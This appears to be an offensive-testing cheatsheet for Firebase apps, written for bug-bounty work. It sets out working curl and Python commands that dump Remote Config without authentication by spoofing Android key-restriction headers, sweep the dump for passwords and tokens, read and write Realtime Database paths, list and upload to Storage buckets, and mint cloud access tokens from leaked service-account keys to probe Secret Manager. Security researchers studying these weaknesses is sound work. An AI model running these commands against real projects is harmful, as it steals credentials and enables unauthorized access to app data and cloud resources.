# Firebase Cheatsheet: Remote Config, RTDB path-scoping, storage, key restriction spoofing

Firebase attack surfaces get their own command set because the planes are independently gated: RTDB rules, Firestore rules, Storage rules, Remote Config namespace, and the Android API-key restriction are FIVE different gates, and the data planes being locked is never evidence the config plane is locked. Pairs with playbook classes 16, 19, 5, and 11c.

Values you need first (all from the APK/asar/JS corpus): `google_api_key` (AIza...), `google_app_id` (1:NNN:android:hex), `project_id`, `databaseURL` (all variants - same project can register several), `storageBucket`, package name, signing cert SHA-1 raw hex (rh_apkrecon signature.txt).

## 1. Remote Config: the unauthenticated config dump (the credential channel)

The namespace is default-open: not covered by RTDB/Firestore/Storage rules, and the Android key restriction (package + cert) is satisfied by anyone who can read strings.xml.

```bash
curl -sv -X POST 'https://firebaseremoteconfig.googleapis.com/v1/projects/<PROJECT>/namespaces/firebase:fetch?key=<API-KEY>' \
  -H 'X-Android-Package: <PACKAGE>' \
  -H 'X-Android-Cert: <RAWHEX-SHA1>' \
  -H 'Content-Type: application/json' \
  -d '{"appId": "<APP-ID>", "appInstanceId": "0000000000000000000000000000000000000000000000000000000000000000"}' 2>&1 | tail -5
```

The appId field is REQUIRED; appInstanceId is a placeholder (zeroed works); no FIS registration needed. 200 + a config JSON = the full production config map.

Mine the dump:
```bash
# nested value-pattern sweep (NOT key names - credentials hide under innocent keys)
python3 - <<'EOF'
import json, re
cfg = json.load(open("rc_dump.json"))
pats = re.compile(r"password|secret|credential|private|apikey|api_key|token|merchant|client", re.I)
def walk(node, path=""):
    if isinstance(node, dict):
        for k, v in node.items(): walk(v, f"{path}.{k}")
    elif isinstance(node, list):
        for i, v in enumerate(node): walk(v, f"{path}[{i}]")
    elif isinstance(node, str) and (pats.search(path) or pats.search(node)):
        print(f"{path} = {node[:80]}")
walk(cfg)
EOF
# also grep for dev hostnames (DuckDNS, *.dev, ip_-style keys) and vendor URLs
grep -oE '[a-z0-9.-]+\.(duckdns\.org|dev|xyz|net|com)' rc_dump.json | sort -u
```

Then replay every recovered credential against its consumer the same session, with a garbage-credential control pair (playbook class 1).

## 2. RTDB: root-denied is NOT path-locked (rules cascade downward)

```bash
# shallow root read (the trap: 401 here reads as "locked")
curl -s -o /dev/null -w '%{http_code}\n' 'https://<PROJECT>-rtdb.firebaseio.com/.json?shallow=true'
# probe the EXACT literal paths the client uses (mine the corpus for ref("/path/") strings):
grep -rn 'ref("' decoded/jadx-out/ | grep -oE 'ref\("[^"]+"' | sort -u
curl -s 'https://<PROJECT>-rtdb.firebaseio.com/<LEAF-PATH>.json' | head -c 300
# write path (artifact, pre-registered, cleaned up):
curl -s -X PUT 'https://<PROJECT>-rtdb.firebaseio.com/<LEAF-PATH>/BB_probe.json' -d '"<MARKER>"'
curl -s 'https://<PROJECT>-rtdb.firebaseio.com/<LEAF-PATH>/BB_probe.json'          # read-back
curl -s -X DELETE 'https://<PROJECT>-rtdb.firebaseio.com/<LEAF-PATH>/BB_probe.json'  # cleanup + 404 read-back
# SSE listener on the same leaf (real-time interception, beats consume-and-delete):
curl -N 'https://<PROJECT>-rtdb.firebaseio.com/<LEAF-PATH>.json' -H 'Accept: text/event-stream' --max-time 90
```

PUT 200 + read-back exact + DELETE 200 at the leaf while root stays 401 = the proof. `event: put` frames landing during your own official-flow write = live-channel proof. Same project, multiple databaseURLs: enumerate every databaseURL in the config blobs (main + "-desktopsso" was real).

## 3. Storage rules probe

```bash
# anonymous list (v2 pagination with continuation-token; v1 marker silently re-serves page 1)
curl -s 'https://firebasestorage.googleapis.com/v0/b/<BUCKET>/o?list-type=2&maxResults=100' | head -c 400
# unauthenticated object read on a discovered path:
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' 'https://firebasestorage.googleapis.com/v0/b/<BUCKET>/o/<OBJECT-PATH>?alt=media'
# upload path (poisoning check, harmless marker object then delete):
curl -s -X POST 'https://firebasestorage.googleapis.com/v0/b/<BUCKET>/o?uploadType=media&name=BB_probe.txt' \
  -H 'Content-Type: text/plain' -d '<MARKER>'
```

## 4. API-key restriction spoofing (Maps / other Google APIs)

The restriction inputs are public inside the APK: package name and the signing cert SHA-1 raw hex.

```bash
# naked call (expected to fail if restricted):
curl -s -o /dev/null -w '%{http_code}\n' 'https://maps.googleapis.com/maps/api/geocode/json?address=jakarta&key=<KEY>'
# spoofed context (the finding when it passes):
curl -s -o /dev/null -w '%{http_code}\n' 'https://maps.googleapis.com/maps/api/geocode/json?address=jakarta&key=<KEY>' \
  -H 'X-Android-Package: <PACKAGE>' -H 'X-Android-Cert: <RAWHEX-SHA1>'
```

200 WITH the headers while the naked call fails = the restriction is public information; that is the finding (matrix the capability set: geocode, static maps, sibling APIs in the same project).

## 5. App-check / v1 push-related Firebase surfaces

```bash
# FCM v1 send capability via service-account JSON (own token only - push-notifications.md):
python3 - <<'EOF'
import json, time, base64, jwt, requests  # pip: pyjwt
sa = json.load(open("service_account.json"))
now = int(time.time())
claims = {"iss": sa["client_email"], "sub": sa["client_email"], "aud": "https://oauth2.googleapis.com/token",
          "iat": now, "exp": now + 3600, "scope": "https://www.googleapis.com/auth/firebase.messaging"}
tok = jwt.encode(claims, sa["private_key"], algorithm="RS256")
r = requests.post("https://oauth2.googleapis.com/token",
                  data={"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": tok})
print(r.json().get("access_token", "")[:40])
EOF
curl -sv -X POST 'https://fcm.googleapis.com/v1/projects/<PROJECT>/messages:send' \
  -H 'Authorization: Bearer <ACCESS-TOKEN>' -H 'Content-Type: application/json' \
  -d '{"message": {"token": "<YOUR-OWN-DEVICE-TOKEN>", "notification": {"title": "BB_PROOF", "body": "<MARKER>"}, "data": {"bb": "1"}}}' 2>&1 | grep -E '< HTTP|name'
```

Legacy server key form lives in push-notifications.md section 2 (same own-token rule).

## 6. Token mint from RC credentials / config entries (chain completion)

```bash
# service-account key found in the dump (full JSON with private_key):
python3 - <<'EOF'
import json, time, jwt, requests
sa = json.load(open("sa_from_dump.json"))
now = int(time.time())
claims = {"iss": sa["client_email"], "aud": "https://oauth2.googleapis.com/token", "iat": now, "exp": now + 3600,
          "scope": "https://www.googleapis.com/auth/cloud-platform"}
tok = jwt.encode(claims, sa["private_key"], algorithm="RS256")
r = requests.post("https://oauth2.googleapis.com/token",
                  data={"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": tok})
at = r.json()["access_token"]
# capability matrix, one harmless call each:
for url in ["https://cloudresourcemanager.googleapis.com/v1/projects/<PROJECT>",
            "https://secretmanager.googleapis.com/v1/projects/<PROJECT>/secrets",
            "https://storage.googleapis.com/storage/v1/b"]:
    rr = requests.get(url, headers={"Authorization": f"Bearer {at}"})
    print(url, rr.status_code)
EOF
```

Every 200 is one CAN row, every 403 one CANNOT row; the matrix is the finding (playbook class 1 proof bar).
